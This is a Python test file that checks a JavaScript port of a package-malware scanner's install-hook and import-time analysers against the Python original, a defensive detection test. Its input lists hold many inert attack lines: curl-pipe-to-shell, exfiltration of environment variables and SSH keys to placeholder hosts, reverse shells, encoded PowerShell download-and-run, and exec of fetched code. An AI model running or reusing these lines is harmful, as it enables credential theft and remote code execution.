"""Engine parity for following install hooks and the install-script and
import-time tests: the npm engine's js/src/lib/hooks.js against
lazaret.scanner.core (follow_hook, install_script_risk,
import_time_risk, node_candidates, shebang_lang, and what they rest on:
_hook_tokens, a shlex tokenizer with a regex fallback, and the `node -e`
pattern).

The JS module re-implements Python's shlex (posix, punctuation_chars,
whitespace_split, no commenters: read_token is the same in CPython 3.10 to
3.14) and compiles core's patterns with Python `re` semantics, so the two
must agree on every input. They are compared case by case, in one node
process, on realistic hook commands and scripts and on a seeded random
corpus built from pieces the functions look at: quotes, backslashes,
operators and redirections, cd, wrappers, interpreters, node flags,
require() calls, download commands, credential and exfiltration markers,
non-ASCII letters (é; ſ and the Kelvin sign, which re.I folds to s and k;
İ and ı), Python-only whitespace (U+001C, U+0085). Each function's result
is compared, and shlex's own tokens (None where it raises) apart from the
fallback. The JS module's copies of core's pattern text and name sets are
compared with core's too.

Characters are those of Unicode 13.0, which the scanner pins source text
to: for a later one (a digit Unicode 14 added, say) core's own answer
depends on the Python version.

All text is inert: hosts are .invalid, TEST-NET or private addresses, and
nothing is executed. Skipped where node is missing.
"""
import base64
import collections
import json
import os
import random
import re
import shlex
import shutil
import subprocess
import threading
import unittest

from lazaret.scanner import core
from tests import _support

NODE = shutil.which("node")
HOOKS_JS = os.path.join(_support.REPO_ROOT, "js", "src", "lib", "hooks.js")
NPM_HOOKS = """
import { readFileSync } from "node:fs";
import { pathToFileURL } from "node:url";
const h = await import(pathToFileURL(process.argv[1]).href);
const cases = JSON.parse(readFileSync(0, "utf8"));
const results = cases.map((s) => [h.shlexSplit(s), h.hookTokens(s), h.followHook(s),
  h.installScriptRisk(s), h.importTimeRisk(s), h.nodeCandidates(s), h.nodeECodes(s), h.shebangLang(s),
  h.importTimeRisk(s, "py"), h.importTimeRisk(s, "js"),
  ((at) => (at < 0 ? -1 : [...s.slice(0, at)].length))(h.selfPublishAt(s)), h.runsDll(s), h.joinStringPieces(s),
  h.decodedView(s), h.spawnedScripts(s)]);
process.stdout.write(JSON.stringify({ twins: h.PY_TWINS, results }));
"""
FIELDS = ("shlex tokens", "_hook_tokens", "follow_hook", "install_script_risk", "import_time_risk",
          "node_candidates", "_NODE_E_RE codes", "shebang_lang", "import_time_risk py", "import_time_risk js",
          "self_publish_at", "runs_dll", "join_string_pieces", "decoded_view", "spawned_scripts")

# Realistic hook commands and install / import-time scripts
CURATED = [
    "node install.js", "node ./scripts/x.mjs", "node install", "node --no-warnings x.js",
    "node -r ./preload.js x.js", "node --require=./preload.cjs --import ./loader.mjs x.js",
    "node --title x y.js", "node -- x.js", "cd scripts && node x.js", "(cd lib; node a.js)",
    "cd native && cd .. && node x.js", "cd /opt/tool && node run.js", "cd /a/.. && node ./x.js",
    "cd /. && node ./x.js", "cd lib && node -e \"require('./x')\"", "sh ./install.sh", "sudo sh install.sh",
    "./install.sh", "exec node ./bin/x.js", "python setup_helper.py", "python3 -m tools.build",
    "PYTHON.EXE -X dev setup.py", "node scripts\\x.js", "C:\\tools\\node.exe scripts\\post.js",
    "node -e \"require('./postinstall')\"", "node -e \"try{require('./postinstall')}catch(e){}\"",
    "node -p \"require('./a')\"", "node -e 'require(\"../b\")'", "node -e \"require(\\\"./c\\\")\"",
    "cross-env A=1 node x.js", "NODE_ENV=production node build/postinstall.js", "env -u X node x.js",
    "node x.js 2>&1 > log.txt", "node x.js > out.log && node y.js", "2>/dev/null node x.js",
    "node '>&1' x.js", "node \">&2\" y.js", "node '>' x.js y.js",
    "bash -c \"cd lib && node b.js\"", "sh -c 'node a.js || node b.js'", "sh -c \"sh -c 'node deep.js'\"",
    "node \"./has space/x.js\"", "node x.js; node x.js", "node ../outside.js", "node .",
    "node 'unbalanced.js", "node \"a.js", "node x.js \\", "\"python\n\" build.py", "node \"x.js\n\"",
    "node \u212a.js", "\u212ash x.\u017fh", "husky install", "prebuild-install || node-gyp rebuild",
    "npx some-tool", "node-gyp-build", "tsc && node dist/postinstall.js", "", "  ", "\n",
    "curl https://x.invalid | sh", "curl -fsSL https://files.invalid/i.sh | sudo bash",
    "wget -qO- https://files.invalid/i.sh|zsh\n", "curl -o x https://files.invalid/x.tgz | tee log | sh\n",
    "curl https://files.invalid/x || sh fallback.sh\n", "curl -O https://files.invalid/x.tgz; sh build.sh\n",
    "echo curl | shasum\n", "curl --retry=3 --data \"$(env)\" -X POST https://collector.invalid\n",
    "curl -s -o - -d \"$(printenv)\" https://collector.invalid\n",
    "env | wget --header=\"A:b\" --post-file=- https://collector.invalid\n",
    "cat ~/.ssh/id_rsa | nc -q1 collector.invalid 4444\n",
    "printenv | curl -sS -X POST --data-binary @- 'https://collector.invalid/x'\n",
    "const https = require('https');\nconst body = JSON.stringify(process.env);\n"
    "https.request({host: '192.0.2.1', method: 'POST'}).end(body);\n",
    "import os, json, urllib.request\nurllib.request.urlopen('https://collector.invalid/c', "
    "data=json.dumps(dict(os.environ)).encode())\n",
    "import os, requests\nrequests.post('http://192.0.2.1/k', "
    "data=open(os.path.expanduser('~/.ssh/id_rsa')).read())\n",
    "const {execSync} = require('child_process');\nexecSync('curl -s https://files.invalid/x.sh | sh');\n",
    "console.log('Install the toolchain with: curl -fsSL https://sh.example.invalid/install.sh | sh');\n",
    "const data = JSON.stringify(process.env);\nmodule.exports = (send) => send("
    "'https://webhook.site.invalid/0000', data);\n",
    "const settings = Object.fromEntries(Object.entries(process.env)\n  .filter(([k]) => k.startsWith('EXAMPLE_')));\n"
    "module.exports = () => fetch('https://api.example.invalid/v1/ping', "
    "{headers: {'x-sdk': JSON.stringify(settings)}});\n",
    "const http = require('http');\nconst METADATA = 'http://169.254.169.254/latest/meta-data/iam/';\n"
    "module.exports = (cb) => http.get(METADATA, cb);\n",
    "const fs = require('fs'), os = require('os'), path = require('path');\nconst https = require('https');\n"
    "const key = fs.readFileSync(path.join(os.homedir(), '.ssh/id_ed25519.pub'));\n"
    "https.request({host: 'deploy.example.invalid', method: 'PUT'}).end(key);\n",
    "import os, subprocess, urllib.request\n\ndef build(cmd):\n    env = os.environ.copy()\n"
    "    return subprocess.run(cmd, env=env, check=True)\n\ndef fetch(url, dest):\n"
    "    urllib.request.urlretrieve(url, dest)\n",
    "const p = 'Local Storage/leveldb';\nfetch('https://collector.invalid');\n",
    "const p = 'LOCAL STORAGE\\\\leveldb';\nfetch('https://collector.invalid');\n",
    "const p = 'Local Storage/LEVELDB';\nfetch('https://collector.invalid');\n",
    "// curl is great; see https://curl.se\nconst env = Object.keys(process.env);\n",
    "var nc = 1;\nconst body = JSON.stringify(process.env);\n", "env || true\ncurl -O https://files.invalid/x.tgz\n",
    "fetch('http://192.0.2.1/x')\n", "HTTP://10.0.0.1:8080/", "ba\u017fe https://pastebin.com.invalid/raw/x",
    "exec(\"bash -i >& /dev/tcp/192.0.2.1/4444 0>&1\")\n", "{**os.environ}\nimport httpx\n",
    "curl " + "--a-b " * 25 + "x", "curl -a " * 200 + "https://files.invalid", "| sh " * 50,
    # wrappers and their options, fd numbers, node -e in a directory, the limits
    "sudo -u me node x.js", "sudo -E -H node x.js", "sudo -D sub node x.js", "sudo --chdir=sub node x.js",
    "env -i node x.js", "env - node x.js", "env -u X node x.js", "env -uX node x.js", "env --unset=X node x.js",
    "env -C sub node x.js", "env -Csub node x.js", "env --chdir sub node x.js", "cd a && env -C ../b node x.js",
    "env -C ~ node x.js", "env -S \"node x.js\"", "env -S'node -r ./p.js x.js'", "env --split-string='node y.js'",
    "env -S 'cd lib && node z.js'", "nice -n 5 node x.js", "nice -10 node x.js", "time -o f.txt node x.js",
    "time -p node x.js", "exec -a name node x.js", "dotenv -e .env -- node x.js", "dotenv -v A=1 node x.js",
    "command -p node x.js", "nohup node x.js &", "sudo -u me env -C sub A=1 node x.js", "sudo -- node x.js",
    "1>out node x.js", "2>&1 node x.js", "node x.js 2> err.log", "node x.js 2>&1 3>&- 4<in",
    "echo 5 > f; node x.js", "node -e \"require('./a')\" && cd lib && node --eval=\"require('./b')\"",
    "cd lib && node -p \"require('../c')\"", "npx node -e \"require('./d')\"",
    "cd a;" * 1200 + "node x.js", "node x.js;" * 1200, " ".join(f"node s{n}.js" for n in range(150)).replace(" node", "; node"),
    "node " + "a" * 4100 + ".js", "cd " + "a" * 4095 + " && node x.js", "x" * 100_001, "\U0001F600" * 50_001,
    "node " + "\U0001F600" * 99_990,
    # #! lines
    "#!/usr/bin/env node\n", "#!/usr/bin/node --harmony\nx", "#! /usr/bin/env -S deno run --allow-all\n",
    "#!/usr/bin/env bun", "#!/usr/local/bin/ts-node", "#!/usr/bin/env tsx\r\n", "#!/usr/bin/python3.11 -u\n",
    "#!/usr/bin/env PYTHON3", "#!C:/Python/python.exe", "#!/bin/sh\n", "#!/usr/bin/env -i bash -x",
    "#!/usr/bin/env\nnode\n", "#!\n/usr/bin/node", "#!/usr/bin/env \n", "#!/usr/bin/perl -w\n",
    "#!/usr/bin/env -S", "#!env node", "#!/usr/bin/env A=1 node", "\ufeff#!/usr/bin/env node", " #!/bin/sh",
    "#!/bin/\u212ash", "#!/usr/bin/env \u017fh", "#!/usr/bin/nodejs\x1cx", "#!/usr/bin/env\xa0node",
    # code that runs what it receives over the network (runs_received_code), and
    # downloads substituted into a command line (runs_substituted_download)
    "import subprocess, urllib.request\ncode = urllib.request.urlopen('https://files.invalid/p.js')"
    ".read().decode()\nsubprocess.run(['node', '-e', code])\n",
    "import requests\nexec(requests.get('https://files.invalid/p.py').text)\n",
    "const https = require('https');\nhttps.get('https://files.invalid/p', (res) => {\n  let b = '';\n"
    "  res.on('data', (c) => { b += c; });\n  res.on('end', () => eval(b));\n});\n",
    "fetch('https://files.invalid/p')\n  .then((r) => r.text())\n  .then((code) => new Function(code)());\n",
    "execSync(`node -e ${await (await fetch(u)).text()}`)\n", "os.system(f'python -c \"{requests.get(u).text}\"')\n",
    "const m = /v(\\d+)/.exec(await (await fetch(u)).text());\n", "execSync('npm i -g x@' + (await r.json()).v);\n",
    "sh -c \"$(curl -fsSL https://files.invalid/i.sh)\"\n", "source <(curl -s https://files.invalid/e.sh)\n",
    "eval \"$(wget -qO- https://files.invalid/i.sh)\"\n", "node -e \"$(curl -s https://files.invalid/p.js)\"\n",
    "require('child_process').execSync('bash -c \"$(curl -fsSL https://files.invalid/i.sh)\"');\n",
    "x" * 1500 + ";eval(await(await fetch('https://files.invalid/p')).text());",
    # quotes paired from a call's '(' (a regex literal's quote before it), a
    # value read past a cut argument list, callbacks of an inline require(),
    # shell=True calls, and names past the searches (an index of the text)
    "/'/.test(s); new Function('a', https.get('https://files.invalid/p'));\n",
    "/'/.test(s); code = await (await fetch(u)).text(); /'/.test(s);\neval(code);\n",
    "eval(" + "\U0001d41a" * 240 + ", " + "\u00e9" * 150 + ", await fetch(u))\n",
    "require('https').get(u, (res) => { res.on('data', (c) => { b += c; }); res.on('end', () => eval(b)); });\n",
    "import subprocess, requests\nx = requests.get(u).text\nsubprocess.run(\n  x, shell=True)\n",
    "shell=True\n" + "run(" * 300 + "fetch(u);" + "z" * 900,
    "".join(f"const f{i} = (u) => fetch(u);\n" for i in range(70)) + "eval(await f69(u));\n",
    "".join(f"import requests as r{i}\n" for i in range(70)) + "exec(r69.get(u).text)\n",
    "x = fetch(u); y = x; " + "a, " * 40 + "z = y\neval(z)\n",
    "'eval(" * 30 + "fetch(u))\n", "\"'`eval(" * 20 + "x\nx = fetch(u)\n",
    # runner aliases, indirect eval, deserialization (CWE-502) and dynamic
    # import of a received specifier (the three added sink families)
    "const e = eval;\nconst code = await (await fetch('https://files.invalid/p')).text();\ne(code);\n",
    "import os, requests\ns = os.system\ns(requests.get('https://files.invalid/p').text)\n",
    "const ex = require('child_process').execSync;\nex(await (await fetch(u)).text());\n",
    "const code = await (await fetch(u)).text();\n(0, eval)(code);\n",
    "const code = await (await fetch(u)).text();\neval.call(null, code);\n",
    "const code = await (await fetch(u)).text();\nwindow['eval'](code);\n",
    "import pickle, requests\npickle.loads(requests.get('https://files.invalid/p').content)\n",
    "import marshal, urllib.request\nmarshal.loads(urllib.request.urlopen(u).read())\n",
    "import yaml, requests\nyaml.load(requests.get(u).text)\n",
    "import yaml, requests\nyaml.load(requests.get(u).text, Loader=yaml.SafeLoader)\n",   # data-only: not it
    "const s = require('node-serialize');\ns.unserialize(await (await fetch(u)).text());\n",
    "const name = await (await fetch('https://files.invalid/p')).text();\nawait import(name);\n",
    "const name = await (await fetch(u)).text();\nrequire(name);\n",
    "import importlib, requests\nimportlib.import_module(requests.get(u).text)\n",
    "import requests\n__import__(requests.get(u).text)\n",
    "const e = eval; e(JSON.parse(x));\n",                    # alias, but no received value: not it
    "x = os.system\nx('ls -la')\n",                            # alias of a fixed command: not it
    # download to a file, then run the file (import-time MAJOR only)
    "import requests, subprocess, sys\ndata = requests.get('https://files.invalid/p').content\n"
    "open('x.py', 'wb').write(data)\nsubprocess.run([sys.executable, 'x.py'])\n",
    "const body = await (await fetch('https://files.invalid/p')).text();\nfs.writeFileSync('m.js', body);\nrequire('./m.js');\n",
    "import urllib.request, subprocess\nurllib.request.urlretrieve('http://x.invalid/t', 'tool.py')\n"
    "subprocess.run(['python', 'tool.py'])\n",
    "const https = require('https');\nhttps.get('https://files.invalid/p', (r) => r.pipe(fs.createWriteStream(dst)));\n"
    "fork(dst);\n",
    "const body = await (await fetch(u)).text();\nfs.writeFileSync('cache.json', body);\n",   # written, not run: not it
    "fs.writeFileSync('x.js', localData);\nrequire('./x.js');\n",                              # no download: not it
]

# The pieces random cases are made of. MIXED reaches every function; the
# others are dense in one mechanism, so that its rarer paths come up often.
MIXED = [
    " ", " ", "  ", "\t", "\n", "\r", "\r\n", "'", "'", "'", '"', '"', '"', "\\", "\\", "\\", "\\\\",
    "&", "|", ";", "(", ")", "<", ">", "&&", "||", ";;", ">>", ">&", "&>", "2>&1", "<<", ">|", "|&",
    "=", "$", "-", "--", "0", "1", "2", "9", "a", "b", "x", "/", ".", "..", "~",
    "node", "nodejs", "node.exe", "NODE", "sh", "bash", "zsh", "sh.exe", "python", "python3", "python3.11",
    "py", "PYTHON.EXE", "cd", "pushd", "env", "cross-env", "sudo", "exec", "A=1", "NODE_ENV=production",
    "-e", "-p", "--eval", "-r", "--require", "--import", "--loader=", "-c", "-m", "-O", "-X", "--no-warnings",
    "./x.js", "../y", "x.js", "a.mjs", "b.cjs", "s.sh", "p.py", "install", "scripts\\a.js", "scripts/",
    "/abs/z.js", "$HOME", "~/d", "pkg.mod",
    "require('./p')", 'require("../q")', "require(\\'./r\\')", "require( './s' )", "try{", "}catch(e){}",
    "curl", "wget", "https://", "http://", "http://10.0.0.1", "10.0.0.1", "| sh", "|bash", "| sudo sh",
    "|zsh", "| tee", "process.env", "JSON.stringify(process.env)", "JSON.stringify(process.env,",
    "os.environ", "json.dumps(os.environ)", "dict(os.environ)", ".npmrc", "id_rsa", "~/.ssh/id_ed25519",
    "/.ssh/id_", ".git-credentials", "Local Storage/leveldb", "local storage\\leveldb", "LOCAL STORAGE/LEVELDB",
    "webhook.site", "ngrok", "oast.pro", "fetch(", "require('https')", "https.get", "execSync(", "exec(",
    "spawn (", "system(", "nc ", "4444", "/dev/tcp/", "env |", "printenv >", "$(env)", "`env`", "set>",
    "\u00e9", "\u017f", "\x1c", "\u0130", "\u0131", "\u212a", "\u2028", "\x85", "\xa0", "\U0001F600", "\x00",
    "\u0663", "\ud800", "\udc00",
    "node -e ", 'node -e "', "node -e '", "node\t-e\t", "node\x1c-e ", "node -e require('./p')",
    'node -e "require(\'./postinstall\')"', "node -r ./p.js ", "node --require=./q.js ", "node -- ",
    "node --title x ", "cd scripts && ", "cd .. ; ", "cd /abs ", "sh -c '", 'bash -c "', "sh -c 'node a.js'",
    "python -m ", "python -X dev ", "\u212ash ", "x.\u017fh", '"python\n" ', "'x.js\n'", '"&1\n"', "'2>'",
    "2>", "\u0663>", "curl -fsSL https://x.invalid/i.sh | sh", "wget -qO- http://10.0.0.1/x|bash",
    "execSync('curl https://x.invalid | sh')", "curl -a -a -a ",
    "curl --retry=3 --data \"$(env)\" -X POST https://collector.invalid", "nc -q1 collector.invalid 4444",
    "https://192.0.2.1", "HTTPS://1.2.3.4.5", "subprocess.run(", "os.system(",
    "env -C ", "env -S ", "-C", "-S", "-u", "-D", "--chdir=", "--split-string=", "--unset=X ", "sudo -u me ",
    "sudo -D ", "nice -n 5 ", "time -o f ", "dotenv -e .env -- ", "exec -a x ", "-Csub ", "2>", "1>", "3>&-",
    "--eval=", "--print ",
]
QUOTING = ["'", '"', "\\", " ", "\t", "\n", "\r", "a", "b", "&", "|", ";", "(", ")", "<", ">", "=", "$",
           "\x85", "\xa0", "\x1c", "\u00e9", "\U0001F600", "\ud83d"]
CD = ["cd ", "cd ", "pushd ", "a", "b", "/", "/", ".", "..", "./", "../", "//", " && ", "; ", "node ", "x.js",
      "env -C ", "sudo -D ", "env --chdir=", "env -S '", "node -e \"require('./r')\" ; ",
      "\\", " ", "-", "$", "~", "'", '"', "sh ", "-c ", "./y.sh", "python ", "p.py",
      "cd /. && ", "cd //. ; ", "cd /./ && ", "cd /a/.. && ", "cd /.. ; ", "cd ./. && ", "cd a/.. ; ",
      "node ./x.js ; ", "node a/../x.js ; ", "sh ./y.sh && ", "node ../z.js ; ", "node . ; ", "node .. ; "]
NODE_E = ["node -e ", "node\t-e\x1c", "node  -e  ", "node -e", "node", " ", "\t", "\x1c", "-e", '"', '"', "'", "'",
          "\\", "\\", "\n", "\r", "a", "require('./p')", "require(\\'./q\\')", "(", ")", "./", "../"]
SCRIPT = ["\n", "\n", " ", "curl -s ", "wget -qO- ", "https://files.invalid/x.sh", " | sh", "|bash", " | sudo zsh",
          ";", "&", "|", "execSync('", "subprocess.run(\"", "os.system('", "')", "\")", "system (",
          "JSON.stringify(process.env)", "JSON.stringify(process.env, null)", "json.dumps(dict(os.environ))",
          "str(os.environ)", "urlencode(os.environ)", "~/.ssh/id_rsa", "/.ssh/id_ed25519.pub", "id_dsa",
          ".git-credentials", "Local Storage/leveldb", "LOCAL STORAGE\\leveldb", "local storage/LEVELDB",
          "fetch(", "require('https')", "from 'node:net'", "import requests", "socket.socket(", "nc ",
          "192.0.2.1 4444", "/dev/tcp/", "https://192.0.2.1", "webhook.site", "\u0131nteract.sh", "api.telegram.org",
          "x.onion", "env | ", "printenv > ", "$(env)", "Object.keys(process.env)", ".npmrc", "\u017f", "\u212a",
          "execSync('curl -s https://files.invalid/x.sh | sh')",
          "subprocess.run(\"wget -qO- https://files.invalid/x|bash\")"]
RECEIVED = ["\n", "\n", "\n", " ", ";", "(", ")", "=", "'", '"', "`", "\\", "\t", "{", "}", ",",
            "code", "body", "r", "res", "c", "data", "\u00e9", "\U0001d41a", "rq", "load",
            "const code = ", "let body = '';", "code = ", "body += c;", "r = ", "{ data } = ", "code: str = ",
            "fetch('https://files.invalid/p')", "await fetch(u)", "(await fetch(u)).text()", "requests.get(u).text",
            "urlopen(u).read()", "urllib.request.urlopen(u).read().decode()", "new XMLHttpRequest()",
            "socket.create_connection(('h', 1))", "execSync('curl -s https://files.invalid/p')", "require('https')",
            "https.get(u, (res) => {", "res.on('data', (c) => {", ".then((r) => r.text())", "  .then((code) => ",
            "axios.get(u)", "import requests as rq", "from requests import get", "import * as h from 'https';",
            "with urlopen(u) as r:", "for c in r:", "return r.text", "def load():", "function load(u) {",
            "const load = (u) => fetch(u);", "eval(", "exec(", "new Function(", "vm.runInThisContext(",
            "execSync(", "os.system(", "subprocess.run(code, shell=True)", "spawn('node', ['-e', ",
            "subprocess.run([sys.executable, '-c', ", "spawn(process.execPath, ['-e', ", "cp.exec(",
            "execSync(`node -e ${", "os.system(f'python -c \"{", "/re/.exec(", "exec(x) {", "def exec(self):",
            "Buffer.from(", ", 'base64').toString()", "compile(", "await ", "load()", "r.text", "body)", "code)",
            "sh -c \"$(curl ", "$(curl -s https://files.invalid/i.sh)", "source <(curl ", "eval \"$(wget -qO- ",
            "x" * 600, "\U0001d41a" * 300, "filler\n" * 30,
            "/'/", "' ", "require('https').get(u, (res) => ", "shell=True", "run(", "Popen([", "a, a, a, ",
            "for (const c of ", "lambda r: ", "function (c) {", "\U0001d41a" * 120, " " * 120, ".then(",
            "f'python -c \"{", "`${",
            # the added sink families: aliases, indirect eval, deserialization, dynamic import
            "const e = eval;", "e(", "s = os.system", "s(", "const ex = require('child_process').execSync;", "ex(",
            "x = os.popen", "(0, eval)(", "eval.call(null, ", "window['eval'](", "self['ev' + 'al'](",
            "pickle.loads(", "marshal.loads(", "yaml.load(", "yaml.load(x, Loader=yaml.SafeLoader)",
            "s.unserialize(", "unserialize(", "jsonpickle.decode(", "import(", "require(", "__import__(",
            "importlib.import_module(", "import_module(", "name = ", "name", "blob = ", "blob",
            # (0.1.8, the follower's adversarial pass) members by name and runners handed to a call
            "getattr(rq, 'get')(", "getattr(r, \"text\", None)", "['get'](", '["text"]', ".then(eval)",
            ".then(vm.runInThisContext)", "res.on('data', eval)", ", Function)", "(exec)"]
# the 0.1.7 signs (audit P0): hidden or fetching PowerShell, stager strings,
# reverse shells, host information sent out, beacons to capture services,
# credentials sent to a named service, a download run with Python
_PS_DOWNLOAD_RUN = base64.b64encode(
    'Invoke-WebRequest -Uri "https://x.invalid/a.exe" -OutFile "a.exe"; Invoke-Expression "a.exe"'.encode("utf-16-le")).decode()
_PS_ECHO = base64.b64encode("echo hi".encode("utf-16-le")).decode()
SIGNS = ["\n", "\n", " ", "'", '"', ";", "(", ")", ",", "=", "\\",
         "subprocess.Popen(", "powershell", "pwsh.exe", "PowerShell.exe", " -WindowStyle Hidden", " -EncodedCommand ",
         " -enc ", " -e ", " -EC ", " /e ", _PS_DOWNLOAD_RUN, _PS_ECHO, "QUJD", "AAAAA", _PS_DOWNLOAD_RUN[:-2] + "=",
         " -c \"irm https://x.invalid/i.ps1 | iex\"", "IEX (New-Object Net.WebClient).DownloadString('https://x.invalid/a')",
         "Invoke-WebRequest -Uri https://x.invalid/a.exe -OutFile a.exe", "Start-Process a.exe", "iwr https://x.invalid/p |",
         " iex", "(New-Object Net.WebClient).DownloadFile('https://x.invalid/a', 'a.exe')",
         'b"""from urllib.request import urlopen as u;exec(u(\'https://x.invalid/p\').read())"""',
         "'import requests;exec(requests.get(\"https://x.invalid\").text)'", "`eval(await (await fetch(u)).text())`",
         "f.write(", "os.dup2(s.fileno(), 0)", "os.dup2(s.fileno(),1)", "subprocess.call(['/bin/sh', '-i'])",
         "pty.spawn('/bin/bash')", "socket.socket()", "s.connect((h, 4444))", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1",
         "nc -e /bin/sh 10.0.0.1 4242", "const sh = require('child_process').spawn('/bin/sh', []);",
         "client.pipe(sh.stdin);", "new net.Socket()", "socket.gethostname()", "os.hostname()", "getpass.getuser()",
         "subprocess.getoutput('whoami')", "$(whoami)", "`hostname`", "requests.post('https://webhook.site/x', data=d)",
         "urllib.request.urlopen('https://x.invalid/?h=' + h)", "https://abc.oastify.com", "pipedream.net",
         "api.telegram.org", "JSON.stringify(process.env)", "json.dumps(dict(os.environ))",
         "discord.com/api/webhooks/1/x", "data = requests.get(u).content", "open('x.py', 'wb').write(data)",
         "subprocess.run([sys.executable, 'x.py'])", "subprocess.run(['python3', 'x.py'])", "\U0001F600", "x" * 100]
SIGN_CURATED = [
    f"subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand {_PS_DOWNLOAD_RUN}', shell=False)",
    f"subprocess.run(['powershell.exe', '-enc', '{_PS_ECHO}'])", f"pwsh -e {_PS_DOWNLOAD_RUN}",
    f"PowerShell /EC {_PS_ECHO}", f"powershell -nop -w hidden -encodedcommand {_PS_DOWNLOAD_RUN[:40]}",
    "powershell -enc QUJD", f"powershell\n-enc {_PS_ECHO}", f"execSync(\"powershell -e {_PS_DOWNLOAD_RUN}\")",
    "import requests, subprocess, sys\ndata = requests.get(u).content\nopen('x.py', 'wb').write(data)\n"
    "subprocess.run([sys.executable, 'x.py'])\n",
    "import urllib.request, subprocess\nurllib.request.urlretrieve('http://files.invalid/t', 'tool.py')\n"
    "subprocess.run(['python', 'tool.py'])\n",
]
# prose (0.1.7): comments, docstrings and strings standing alone, which the
# import-time test reads out of a Python or JavaScript file, around exec calls
# that PowerShell must be an argument of, and the code that stays code
PROSE = ["\n", "\n", "\n", " ", "    ", "\t", "#", "# ", "//", "// ", "/*", "*/", '"""', "'''", 'r"""', "f'''", "b'''",
         '"', "'", "`", "\\", "\\\n", ":", "def f():", "class C:", "(", ")", "[", "]", "{", "}", ",", "=", "+", ".",
         "x = ", "return ", "__doc__", "exec(__doc__)", "os.system(", "subprocess.run([", "subprocess.Popen(", "execSync(",
         "'powershell'", '"pwsh"', "powershell", " -c ", " -enc ", _PS_DOWNLOAD_RUN, '"irm https://x.invalid/i.ps1 | iex"',
         "iwr https://x.invalid/a | iex", "Start-Process a.exe", "Invoke-WebRequest -Uri https://x.invalid/a.exe -OutFile a.exe",
         "id_rsa", "~/.ssh/id_ed25519", "requests.post(u, data=d)", "import requests", "json.dumps(dict(os.environ))",
         "JSON.stringify(process.env)", "fetch(u)", "socket.gethostname()", "os.hostname()", "webhook.site",
         "exec(urlopen(u).read())", "eval(await (await fetch(u)).text())", "execSync('curl https://x.invalid | sh')",
         "\u00e9", "\U0001F600", "\u2028", "\x1c"]
# code read back from the file itself (0.1.7): its own source, its docstring,
# a function's text, a data file next to it — and runners, names and quotes
SELF = ["\n", "\n", " ", "(", ")", "'", '"', '"""', "#", "//", "/*", "*/", "=", ".", ",", "[1]", "[0]",
        "open(__file__)", "open(os.path.abspath(__file__))", ".read()", "Path(__file__).read_text()", "__doc__",
        "x.__doc__", "linecache.getlines(__file__)", "__loader__.get_source(__name__)", "readFileSync(__filename, 'utf8')",
        "fs.readFile(__filename)", "readFileSync(new URL(import.meta.url))", "arguments.callee", "}).toString()",
        "(function(){/*x*/}).toString()", "os.path.join(os.path.dirname(__file__), 'logo.png')",
        "(Path(__file__).parent / 'data.bin').read_bytes()", "path.join(__dirname, 'a.dat')", "'pkg/version.py'",
        "exec(", "eval(", "compile(", "new Function(", "vm.runInThisContext(", "execSync(", "os.system(",
        "subprocess.run(", "src = ", "code = ", "const p = ", "src", "code", "p", ".split('#')", ".slice(2)",
        "zlib.decompress(", "b64decode(", "requests.post(u, data=socket.gethostname())", "# C2: https://webhook.site/x",
        "\U0001F600", "x" * 50]
SELF_CURATED = [
    "# C2: https://webhook.site/abc\nimport socket, requests, re\nurl = re.search(r'# C2: (\\S+)', open(__file__).read()).group(1)\n"
    "requests.post(url, data=socket.gethostname())\n",
    '"""\nimport os; os.system("id")\n"""\nexec(open(__file__).read().split(\'"""\')[1])\n',
    'src = open(__file__).read()\ncode = src.split("#!")[1]\nexec(code)\n#!print(1)\n',
    '"""print(1)"""\nexec(__doc__)\n',
    'import os\nexec(open(os.path.join(os.path.dirname(__file__), "logo.png")).read())\n',
    "const fs = require('fs');\neval(fs.readFileSync(__filename, 'utf8').split('/*')[1].split('*/')[0]);\n/* x */\n",
    "const p = (function(){/*require('child_process').execSync('id')*/}).toString();\n"
    "new Function(p.slice(p.indexOf('/*') + 2, p.lastIndexOf('*/')))();\n",
    "import os\nhere = os.path.dirname(__file__)\nexec(open(os.path.join(here, 'pkg', 'version.py')).read())\n",
    'x = """exec(open(__file__).read())"""\nprint(x)\n',
    "const on = open(__file__).read()\nexec(on)\n",
]
PROSE_CURATED = [
    # a CLI's self-update (huggingface-hub): a comment and a docstring show a cradle, the argv is returned
    "import subprocess\n\ndef run_update():\n    return subprocess.call(_cmd())\n\n\ndef _cmd():\n"
    "    # `iwr ... | iex` cannot take parameters: create a scriptblock\n"
    "    return [\"powershell\", \"-NoProfile\", \"-Command\", \"& ([scriptblock]::Create((iwr -useb https://x.invalid/i.ps1)))\"]\n",
    'def installed():\n    """True when installed with\n        powershell -ExecutionPolicy ByPass -c "irm https://x.invalid/i.ps1 | iex"\n    """\n'
    "    return True\n",
    # an SSH client (paramiko): a docstring names ``id_rsa``, the file opens sockets
    'import socket\n\nclass Client:\n    def load(self):\n        """Loads ``id_rsa`` and ``id_rsa-cert.pub``."""\n'
    "        return socket.socket()\n",
    # still code: a string that is an argument, a joined string, a file that runs its own docstring
    "import subprocess\nsubprocess.run(\n    [\n        \"powershell\",\n        \"-c\",\n"
    "        \"irm https://x.invalid/i.ps1 | iex\",\n    ]\n)\n",
    'import os\ncmd = ("powershell -c "\n       "\\"irm https://x.invalid/i.ps1 | iex\\"")\nos.system(cmd)\n',
    '"""\nimport urllib.request\nexec(urllib.request.urlopen("https://x.invalid/p").read())\n"""\nexec(__doc__)\n',
    "const https = require('https');\n// JSON.stringify(process.env) is never sent\nhttps.get(u);\n",
    "/* a beacon: os.hostname() to webhook.site */\nmodule.exports = 1;\n",
    'x = 1\n"""\nrequests.post("https://webhook.site/0", data=socket.gethostname())\n"""\n',
    'x = \\\n"""requests.post("https://webhook.site/0", data=socket.gethostname())"""\n',
]
# persistence targets (0.1.7): an agent's or editor's auto-run settings, a
# workflow, an editor extension, a runner, the Bun loader, a secrets dump —
# their paths whole and split, the writes, and the words around them
PERSIST = ["\n", "\n", " ", "  ", "\t", "'", '"', "`", ", ", " + ", " / ", "/", "\\", "(", ")", ";", "|", "&", "=",
           ".claude/settings.json", ".claude/settings.local.json", ".gemini\\settings.json", ".vscode/tasks.json",
           ".vscode/mcp.json", ".cursor/hooks.json", ".cursor/mcp.json", ".mcp.json", ".claude.json", "x.mcp.json",
           ".claude/settings.jsonc", "'.claude'", "'settings.json'", '".vscode"', '"tasks.json"', "`.cursor`",
           "'hooks.json'", "'mcp.json'", "'.gemini'", "'settings.local.json'", "'.github'", "'workflows'",
